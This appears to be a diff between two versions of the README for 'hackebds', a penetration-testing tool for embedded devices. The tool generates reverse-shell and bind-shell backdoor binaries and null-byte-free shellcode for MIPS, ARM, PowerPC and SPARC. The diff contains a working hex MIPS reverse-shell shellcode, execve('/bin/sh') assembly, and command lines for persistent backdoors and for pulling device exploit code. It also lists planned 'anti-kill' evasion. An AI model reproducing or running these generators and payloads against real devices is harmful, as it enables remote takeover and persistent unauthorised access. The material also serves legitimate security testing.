+   >>> armelv7_backdoor(reverse_ip,reverse_port)
+   >>> armebv5_backdoor(reverse_ip,reverse_port)
+   >>> armebv7_backdoor(reverse_ip,reverse_port)
+   >>> mips64_backdoor(reverse_ip,reverse_port)
+   >>> mips64el_backdoor(reverse_ip,reverse_port)
+   >>> x86el_backdoor(reverse_ip,reverse_port)
+   >>> x64el_backdoor(reverse_ip, reverse_port)
+   >>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
+   >>> sparc64.sparc_backdoor(reverse_ip, reverse_port)#big endian
+   >>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
+   >>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
+   >>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
+   >>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
+   >>> x86_bind_shell(listen_port, passwd)
+   >>> x64_bind_shell(listen_port, passwd)
+   >>> armelv7_bind_shell(listen_port, passwd)
+   >>> aarch64_ bind_ shell(listen_port, passwd)
+   >>> mips_bind_shell(listen_port, passwd)
+   >>> mipsel_bind_shell(listen_port, passwd)
+   >>> sparc32.sparc_bind_shell(listen_port, passwd)
+   >>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
+
+（Note that the maximum password length is 4 characters for
+x86（32bits） and 8 characters for x64（64bits））
+
+.. code:: 
+
+   >>> mipsel_backdoor("127.0.0.1",5566)
+   [+] reverse_ip is: 127.0.0.1
+   [+] reverse_port is: 5566
+   [*] waiting 3s
+   [+] mipsel_backdoor is ok in current path ./
+   >>>
+
+.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png
+   :alt: 
+
+.. code:: 
+
+   >>> from hackebds import *
+   >>> x86_bind_shell(4466,"doud")
+   [+] bind port is set to 4466
+   [+] passwd is set to 'doud'
+   0x0000000064756f64
+   [*] waiting 3s
+   [+] x86_bind_shell is ok in current path ./
+   >>>
+
+.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png
+   :alt: 
 
 Then connect to the port bound to the device (password exists)
 
-![image-20221028144136069](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png)
+.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png
+   :alt: 
 
-2. Generates the use-back shellcode (no free) null bytes corresponding to various architectures
+1. Generates the use-back shellcode (no free) null bytes corresponding
+   to various architectures
 
-```
->>> from hackebds import *
->>> mipsel_reverse_sl(reverse_ip,reverse_port)
->>> mips_reverse_sl(reverse_ip,reverse_port)
->>> aarch64_reverse_sl(reverse_ip,reverse_port)
->>> armelv5_reverse_sl(reverse_ip,reverse_port)
->>> armelv7_reverse_sl(reverse_ip,reverse_port)
->>> armebv5_reverse_sl(reverse_ip,reverse_port)
->>> armebv7_backdoor(reverse_ip,reverse_port)
->>> mips64_reverse_sl(reverse_ip,reverse_port)
->>> mips64el_reverse_sl(reverse_ip,reverse_port)
->>> android_aarch64_backdoor(reverse_ip,reverse_port)
->>> x86el_reverse_sl(reverse_ip,reverse_port)
->>> x64el_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
-```
+.. code:: 
 
-example:
+   >>> from hackebds import *
+   >>> mipsel_reverse_sl(reverse_ip,reverse_port)
+   >>> mips_reverse_sl(reverse_ip,reverse_port)
+   >>> aarch64_reverse_sl(reverse_ip,reverse_port)
+   >>> armelv5_reverse_sl(reverse_ip,reverse_port)
+   >>> armelv7_reverse_sl(reverse_ip,reverse_port)
+   >>> armebv5_reverse_sl(reverse_ip,reverse_port)
+   >>> armebv7_backdoor(reverse_ip,reverse_port)
+   >>> mips64_reverse_sl(reverse_ip,reverse_port)
+   >>> mips64el_reverse_sl(reverse_ip,reverse_port)
+   >>> android_aarch64_backdoor(reverse_ip,reverse_port)
+   >>> x86el_reverse_sl(reverse_ip,reverse_port)
+   >>> x64el_reverse_sl(reverse_ip,reverse_port)
+   >>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
+   >>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
+   >>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
+   >>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
 
-```
->>> from hackebds import *
->>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
-[+] No NULL byte shellcode for hex(len is 264):
-\xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
-```
+example:
 
-3. Added that shellcode for calling execve cannot be generated in shellcraft (change context generate mips64(el), powerpc shell code for execve("/bin/sh",["/bin/sh"]),0))
+.. code:: 
 
-   ```
    >>> from hackebds import *
-   >>> test = ESH()
-   [*] arch is i386
-   [*] endian is little
-   [*] bits is 32
-   >>> test.sh()
-   [*] Please set correct assembly schema information(pwerpc or mips64(el))
-   >>> context.arch = 'mips64'
-   >>> test.sh()
-   "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
-   >>> test.sh()
-   
-   ```
+   >>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
+   [+] No NULL byte shellcode for hex(len is 264):
+   \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
+
+1. Added that shellcode for calling execve cannot be generated in
+   shellcraft (change context generate mips64(el), powerpc shell code
+   for execve("/bin/sh",["/bin/sh"]),0))
+
+   .. code:: 
+
+      >>> from hackebds import *
+      >>> test = ESH()
+      [*] arch is i386
+      [*] endian is little
+      [*] bits is 32
+      >>> test.sh()
+      [*] Please set correct assembly schema information(pwerpc or mips64(el))
+      >>> context.arch = 'mips64'
+      >>> test.sh()
+      "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
+      >>> test.sh()
 
-## chips and architectures
+chips and architectures
+-----------------------
 
 Tests can leverage chips and architectures
 
-Mips:
-MIPS 74kc V4.12 big endian,
-MIPS 24kc V5.0  little endian (Ralink SoC) like MediaTek MT7621
-Ingenic Xburst V0.0  FPU V0.0  little endian
-
-Armv7:
-Allwinner(全志)V3s
-
-Armv8:
-Qualcomm Snapdragon 660
-BCM2711
+| Mips:
+| MIPS 74kc V4.12 big endian,
+| MIPS 24kc V5.0 little endian (Ralink SoC) like MediaTek MT7621
+| Ingenic Xburst V0.0 FPU V0.0 little endian
+
+| Armv7:
+| Allwinner(全志)V3s
+
+| Armv8:
+| Qualcomm Snapdragon 660
+| BCM2711
 
 Powerpc, sparc: qemu
 
+🍺enjoy hacking
+---------------
 
-## :beer:enjoy hacking
+updating
+--------
 
+2022.4.19 Added support for aarch64 null-byte reverse_shellcode
 
-## updating
+2022.4.30 Reduced amount of code using functions and support python3
 
- 2022.4.19 Added support for aarch64 null-byte reverse_shellcode
+2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and
+mipsel_reverse_sl were not enabled, added mips64_backdoor,
+mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl
+generation
 
- 2022.4.30 Reduced amount of code using functions and support python3
+2022.5.21 0.0.9 version changed the generation method of armel V5
+backdoor and added the specified generation of riscv-v64 backdoor
 
- 2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and mipsel_reverse_sl were not enabled, added mips64_backdoor, mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl generation
+2022.6.27 0.1.0 Added Android backdoor generation
 
- 2022.5.21 0.0.9 version changed the generation method of armel V5 backdoor and added the specified generation of riscv-v64 backdoor
+2022.10.26 0.1.5 Fixed some problems and added some automatic generation
+functions of bindshell specified port passwords
 
- 2022.6.27 0.1.0 Added Android backdoor generation
+2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)
 
- 2022.10.26 0.1.5 Fixed some problems and added some automatic generation functions of bindshell specified port passwords
+2022.11.1 Removed the generation sleep time of shellcode, and added
+mips\_ bind\_ Shell, reverse of x86 and x64 small end\_ shell\_
+Backdoor, the mips that are expected to be interrupted by mips\_ bind\_
+Shell, which solves the error of password logic processing in the
+bindshell in mips
 
- 2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)
+|  2022.11.2 Joined aarch64\_ bind\_ shell
+|  2022.11.2 Support command line generation backdoor and shell code,
+  characterized by light, small, efficient and fast
 
- 2022.11.1 Removed the generation sleep time of shellcode, and added mips_ bind_ Shell, reverse of x86 and x64 small end_ shell_ Backdoor, the mips that are expected to be interrupted by mips_ bind_ Shell, which solves the error of password logic processing in the bindshell in mips
+2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some
+bug
 
- 2022.11.2 Joined aarch64_ bind_ shell
- 2022.11.2 Support command line generation backdoor and shell code, characterized by light, small, efficient and fast
+2022.12.26 0.2.9 Added the program function of generating specified
+commands, and added executable permissions after generating files
 
- 2022.12.6 0.2.8 Add sparc_bind_shell && powerpc_bind_shell ，fix some bug
+2023.1.6 0.3.0 repaired cmd\_ The file generates the function bug of
+executing the specified command program, and adds the model ->arch list,
+Android bind\_ Shell file
 
- 2022.12.26 0.2.9 Added the program function of generating specified commands, and added executable permissions after generating files
+2023.1.16 0.3.1 Added bash reverse\_ Shell. At present, this tool only
+supports sh and bash. The - l function is added to list the relationship
+between device model and architecture, and the - power function is added
+to generate a more powerful reverse\_ shell\_ File, which realizes the
+continuous creation of reverse shell links without killing the program.
+Currently, the - power function only supports reverse\_ shell\_ file
 
- 2023.1.6 0.3.0 repaired cmd_ The file generates the function bug of executing the specified command program, and adds the model ->arch list, Android bind_ Shell file
+2023.1.29 0.3.3 -The power function adds support for bind_shell,
+bind_shell is more stable, and fixes some bugs in the execution of
+bind_shell and cmd_file files of the aarch64 architecture
 
- 2023.1.16 0.3.1 Added bash reverse_ Shell. At present, this tool only supports sh and bash. The - l function is added to list the relationship between device model and architecture, and the - power function is added to generate a more powerful reverse_ shell_ File, which realizes the continuous creation of reverse shell links without killing the program. Currently, the - power function only supports reverse_ shell_ file
+2023.3.7 0.3.6 Added support for the mipsn32 architecture (this
+architecture may be encountered in devices such as zyxel firewalls)
 
- 2023.1.29 0.3.3 -The power function adds support for bind_shell, bind_shell is more stable, and fixes some bugs in the execution of bind_shell and cmd_file files of the aarch64 architecture
+Problems to be solved
+---------------------
 
-## Problems to be solved
+Support the backend of the loongarch64 architecture and the generation
+of the bind_shell program (binutils has been integrated into the
+mainline, but cannot be installed directly through apt)
 
-Support the backend of the loongarch64 architecture and the generation of the bind_shell program (binutils has been integrated into the mainline, but cannot be installed directly through apt)
-
-Improve the generation of power_bind_shell backdoors of powerpc and sparc series
+Improve the generation of power_bind_shell backdoors of powerpc and
+sparc series
 
 Add anti-kill function for backdoor programs
 
+vul fix
+-------
 
+CVE-2021-29921 The tool is a complete client program. This vulnerability
+will not affect the use of the tool. If you want to fix it, please run
+the tool in python 3.9 and above
 
-## vul fix
-
-
-CVE-2021-29921 The tool is a complete client program. This vulnerability will not affect the use of the tool. If you want to fix it, please run the tool in python 3.9 and above
+CVE-2022-40023 DOS_attack pip install -U mako (The vulnerability does
+not apply to this tool)
 
-CVE-2022-40023 DOS_attack pip install -U  mako (The vulnerability does not apply to this tool)
+CVE-2021-20270 DOS_attack pip install -U pygments (The vulnerability
+does not apply to this tool)
 
-CVE-2021-20270 DOS_attack pip install -U  pygments (The vulnerability does not apply to this tool)
+0.2.5 Version Repair directory traversal in the specified model
 
- 0.2.5 Version Repair directory traversal in the specified model
-
- ## Verion List
-
-| VERSION                                                      | PUBLISHED    | DIRECT VULNERABILITIES |
-| ------------------------------------------------------------ | ------------ | ---------------------- |
-| [0.3.2](https://security.snyk.io/package/pip/hackebds/0.3.2) | 18 Jan, 2023 | 0C0H0M0L               |
-| [0.3.1](https://security.snyk.io/package/pip/hackebds/0.3.1) | 16 Jan, 2023 | 0C0H0M0L               |
-| [0.3.0](https://security.snyk.io/package/pip/hackebds/0.3.0) | 6 Jan, 2023  | 0C0H0M0L               |
-| [0.2.9](https://security.snyk.io/package/pip/hackebds/0.2.9) | 26 Dec, 2022 | 0C0H0M0L               |
-| [0.2.8](https://security.snyk.io/package/pip/hackebds/0.2.8) | 6 Dec, 2022  | 0C0H0M0L               |
-| [0.2.7](https://security.snyk.io/package/pip/hackebds/0.2.7) | 22 Nov, 2022 | 0C0H0M0L               |
-| [0.2.3](https://security.snyk.io/package/pip/hackebds/0.2.3) | 15 Nov, 2022 | 0C0H0M0L               |
-| [0.2.2](https://security.snyk.io/package/pip/hackebds/0.2.2) | 8 Nov, 2022  | 0C0H0M0L               |
-| [0.2.1](https://security.snyk.io/package/pip/hackebds/0.2.1) | 7 Nov, 2022  | 0C0H0M0L               |
-| [0.2.0](https://security.snyk.io/package/pip/hackebds/0.2.0) | 2 Nov, 2022  | 0C0H0M0L               |
-| [0.1.9](https://security.snyk.io/package/pip/hackebds/0.1.9) | 2 Nov, 2022  | 0C0H0M0L               |
-| [0.1.6](https://security.snyk.io/package/pip/hackebds/0.1.6) | 27 Oct, 2022 | 0C0H0M0L               |
-| [0.1.5](https://security.snyk.io/package/pip/hackebds/0.1.5) | 26 Oct, 2022 | 0C0H0M0L               |
-| [0.1.3](https://security.snyk.io/package/pip/hackebds/0.1.3) | 27 Jun, 2022 | 0C0H0M0L               |
-| [0.1.2](https://security.snyk.io/package/pip/hackebds/0.1.2) | 27 Jun, 2022 | 0C0H0M0L               |
-| [0.1.1](https://security.snyk.io/package/pip/hackebds/0.1.1) | 27 Jun, 2022 | 0C0H0M0L               |
-| [0.0.9](https://security.snyk.io/package/pip/hackebds/0.0.9) | 21 May, 2022 | 0C0H0M0L               |
-| [0.0.8](https://security.snyk.io/package/pip/hackebds/0.0.8) | 5 May, 2022  | 0C0H0M0L               |
-| [0.0.7](https://security.snyk.io/package/pip/hackebds/0.0.7) | 30 Apr, 2022 | 0C0H0M0L               |
-| [0.0.6](https://security.snyk.io/package/pip/hackebds/0.0.6) | 30 Apr, 2022 | 0C0H0M0L               |
-| [0.0.5](https://security.snyk.io/package/pip/hackebds/0.0.5) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.4](https://security.snyk.io/package/pip/hackebds/0.0.4) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.3](https://security.snyk.io/package/pip/hackebds/0.0.3) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.2](https://security.snyk.io/package/pip/hackebds/0.0.2) | 29 Apr, 2022 | 0C0H0M0L               |
-| [0.0.1](https://security.snyk.io/package/pip/hackebds/0.0.1) | 29 Apr, 2022 | 0C0H0M0L               |
+.. |image1| image:: https://img.shields.io/pypi/wheel/hackebds
+.. |image2| image:: https://img.shields.io/pypi/pyversions/pwntools
+.. |image3| image:: https://static.pepy.tech/badge/hackebds
+   :target: https://pepy.tech/project/hackebds
```

### Comparing `hackebds-0.3.6/README.rst` & `hackebds-0.3.7/hackebds.egg-info/PKG-INFO`

 * *Files 16% similar despite different names*

```diff
@@ -1,487 +1,498 @@
-hackebds
-========
-
-| |image1|\ |image2|
-| |image3|
-
-🔗\ `中文readme <https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md>`__
-
-foreword
---------
-
-   In the process of penetration and vulnerability mining of embedded
-   devices, many problems have been encountered. One is that some
-   devices do not have telnetd or ssh services to obtain an interactive
-   shell，Some devices are protected by firewall and cannot be connected
-   to it in the forward direction Reverse_shell is required, and the
-   other is that memory corruption vulnerabilities such as stack
-   overflow are usually Null bytes are truncated, so it is more
-   troublesome to construct reverse_shellcode, so this tool was
-   developed to exploit the vulnerability. This tool is developed based
-   on the PWN module and currently uses the python2 language，\ **Has
-   been updated to python3**
-
-fuction
--------
-
-This tool is embedded in the security test of the device. There are two
-main functions:
-
-1. Generate **backdoor programs** (only ELF) of various architectures.
-   The backdoor program is packaged in shellless pure shellcode and is
-   smal，Pure static backdoor .\ **Armv5, Armv7, Armv8, mipsel,
-   mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32 are
-   now supported, and they are still being updated** (PS:bash support is
-   added to the reverse shell after version 0.3.1). If the backdoor of
-   the reverse shell is generated with the - power parameter, the
-   reverse shell will continue to be generated on the target machine)
-
-2. Generate **reverse_shell shellcode** (only linux) of various
-   architectures during the exploit process, and no null bytes, which
-   facilitates the exploitation of memory corruption vulnerabilities on
-   embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64,
-   mipsel64, powerpc, powerpc64,sparc are now supported, and they are
-   still being updated**
-
-3. Generate bind of various architectures bind_Shell(only ELF) file,
-   -power can persistent bind_shell
-
-4. Sort out the exploitable vulnerability POC or EXP of the embedded
-   device, and search and output the basic information and POC of the
-   device model in use: Function of equipment, Architecture of
-   equipment,Device CPU manufacturer,Device CPU model,WEB service
-   program of the device, and so on
-
-5. Support command line generation backdoor and shell code, Strong anti
-   hunting ability,characterized by light, small, efficient and fast
-
-install
--------
-
-Just use pip to install, if the installation fails, try to use sudo to
-install
-
-.. code:: 
-
-   Use pip install:
-   pip(3) install -U hackebds
-
-   local install:
-   git clone https://github.com/doudoudedi/hackEmbedded
-   sudo ./start.sh
-
-（If you want this tool to run on a MacOS system, you need to include
-python/bin in the bashrc environment variable）
-
-.. code:: 
-
-   echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
-
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png
-   :alt: 
-
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png
-   :alt: 
-
-Instructions for use
-~~~~~~~~~~~~~~~~~~~~
-
-.. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png
-   :alt: 
-
-| Please install the corresponding binutils environment before use
-| expample:
-
-.. code:: 
-
-   Ubuntu（debian）:
-     apt search binutils | grep arm（You can replace it here， if not please execute "apt update" first）
-     apt install binutils-arm-linux-gnueabi/hirsute
-    MacOS:
-    	 https://github.com/Gallopsled/pwntools-binutils
-    	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
-
-1. Use the command line to generate the backdoor file name, shellcode,
-   bindshell, etc
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png
-      :alt: 
-
-   .. code:: 
-
-      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png
-      :alt: 
-
-   .. code:: 
-
-      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
-
-   By default, the reverse shell backdoor is created using sh. If bash
-   is required (PS: here, the bash command needs to exist on the target
-   device)
-
-   .. code:: 
-
-      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
-
-   If you need to generate a backdoor and constantly create reverse
-   shells (the CPU occupied by the test is about% 8)
-
-   .. code:: 
-
-      hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png
-      :alt: 
-
-   .. code:: 
-
-      hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
-
-   Create bind_shell to monitor the shell as sh, -power fuction can give
-   -shell bash
-
-   .. code:: 
-
-      hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
-
-   The bind_shell process will not stop after being disconnected, and
-   supports repeated connections (currently this function is not
-   supported by powerpc and sparc series)
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png
-      :alt: 
-
-   Generate cmd_file function is updated. Only need to specify the - cmd
-   parameter to generate programs for various architectures to execute
-   corresponding commands , -envp Environment variables are separated by
-   commas
-
-   .. code:: 
-
-      hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png
-      :alt: 
-
-   | The list relationship between the output model and the architecture
-     is added to the function of generating the back door of the
-     specified model to facilitate the user to observe and modify. The
-     output information will be enhanced after version 0.3.5, such as
-     (60 device information, POC40+or so):
-   | Function of equipment
-   | Architecture of equipment
-   | Device CPU manufacturer
-   | Device CPU model
-   | WEB service program of the device
-   | Device default SSH service support
-   | Can monitoring be realized
-   | Device default telnet user password
-   | Device sdk support
-   | Openwrt support for devices
-   | Whether the device is vulnerable
-   | POC output
-
-   .. code:: 
-
-      hackebds -l
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png
-      :alt: 
-
-   Add the retrieval of device information. Use - s to search for the -
-   model parameter. This search is fuzzy and insensitive to case. Try to
-   use the device information with the highest matching degree between
-   lowercase output and input when inputting
-
-   If the following error occurs
-
-   hackebds: error: argument -model: expected one argument
-
-   Please set all parameters to lowercase or lowercase mixed with
-   uppercase. I guess it is due to the conflict between python and bash
-   in the interpretation of uppercase and lowercase letters
-
-   .. code:: 
-
-      hackebds -model ex200 -s
-
-   If the following warning occurs during command output
-
-   | /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11:
-     UserWarning: Using slow pure-python SequenceMatcher. Install
-     python-Levenshtein to remove this warning
-   |  warnings.warn('Using slow pure-python SequenceMatcher. Install
-     python-Levenshtein to remove this warning')
-
-   If the following warning occurs during command output, you can use
-   the following command to install python-levenshtein. After
-   installation, the command retrieval speed can be increased by about 4
-   times
-
-   .. code:: 
-
-      pip install python-levenshtein
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png
-      :alt: 
-
-   The POC corresponding to the generated device can use - p or -- poc,
-   which may be python scripts, commands, etc., and may need to be
-   modified by yourself
-
-   .. code:: 
-
-      hackebds -model ex200 -p
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png
-      :alt: 
-
-   If a vulnerability is found in the test and you want to add the basic
-   information of a new device to this tool, you can use the - add
-   function for POC files or "/tmp/model_tree_info/" The format of the
-   directory directory of the new device under the info/directory can
-   refer to the standard generated format. After the insertion, you can
-   use the tool search and POC generation functions，Finally, if you
-   need to fill in the POC file information, you can put it in
-   "/tmp/model_tree_info/xxx/POC" directory will be read if retrieved
-   again
-
-   .. code:: 
-
-      hackebds -add
-
-   .. figure:: https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png
-      :alt: 
-
-   If there are device information errors, POC errors, or you want to
-   integrate your collected device information with vulnerabilities,
-   please contact me doudoudedi233@gmail.com
-
-2. Generate backdoor programs of various architectures, encapsulate pure
-   shellcode, and successfully connect to the shell
-
-.. code:: 
-
-   >>> from hackebds import *
-   >>> mipsel_backdoor(reverse_ip,reverse_port)
-   >>> mips_backdoor(reverse_ip,reverse_port)
-   >>> aarch64_backdoor(reverse_ip,reverse_port)
-   >>> armelv5_backdoor(reverse_ip,reverse_port)
-   >>> armelv7_backdoor(reverse_ip,reverse_port)
-   >>> armebv5_backdoor(reverse_ip,reverse_port)
-   >>> armebv7_backdoor(reverse_ip,reverse_port)
-   >>> mips64_backdoor(reverse_ip,reverse_port)
-   >>> mips64el_backdoor(reverse_ip,reverse_port)
-   >>> x86el_backdoor(reverse_ip,reverse_port)
